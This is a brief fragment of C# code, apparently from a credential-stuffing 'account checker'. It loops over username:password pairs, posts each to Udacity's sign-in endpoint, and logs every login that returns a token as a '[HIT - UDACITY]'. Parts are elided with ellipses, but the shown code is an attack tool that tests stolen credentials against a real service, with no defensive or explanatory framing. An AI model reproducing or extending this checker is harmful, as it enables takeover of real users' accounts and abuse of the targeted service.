        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://user-api.udacity.com/signin", str, "application/json;charset=UTF-8").ToString().Contains("{\"jwt\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - UDACITY] " + s[0] + ":" + s[1], Color.Green);
